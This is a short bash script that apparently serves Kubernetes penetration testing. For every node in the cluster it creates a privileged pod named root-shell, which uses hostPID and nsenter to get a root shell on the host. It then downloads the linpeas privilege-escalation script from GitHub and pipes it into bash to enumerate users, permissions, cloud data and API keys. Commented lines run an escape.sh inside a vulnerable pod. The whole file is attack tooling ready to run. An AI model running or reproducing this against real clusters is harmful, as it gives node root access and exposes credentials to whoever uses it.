#!/bin/bash
NODES=$(kubectl get nodes -o json | jq -r '.items[] | .metadata.name')

# for each node run linpeas (or whatever)
for NODE in $NODES; do
echo $NODE
cat > nsenter_$NODE.yaml <<-EOF
apiVersion: v1
kind: Pod
metadata:
  name: root-shell-$NODE
  namespace: kube-system
spec:
  containers:
    - name: shell
      image: alpine
      command:
        - nsenter
      args:
        - '-t'
        - '1'
        - '-m'
        - '-u'
        - '-i'
        - '-n'
        - tail
        - '-f'
        - /dev/null
      securityContext:
        privileged: true
  hostNetwork: true
  hostPID: true
  hostIPC: true
  nodeName: $NODE
EOF
kubectl apply -f nsenter_$NODE.yaml
kubectl exec -it -n kube-system root-shell-$NODE -- sh -c "curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240218-68f9adb3/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
#kubectl cp escape.sh vulnerable-privileged-pod-779996ffd6-tvpfk:/escape.sh
#kubectl exec -it vulnerable-privileged-pod-779996ffd6-tvpfk -- chmod 755 /escape.sh
#kubectl exec -it vulnerable-privileged-pod-779996ffd6-tvpfk -- /escape.sh
done

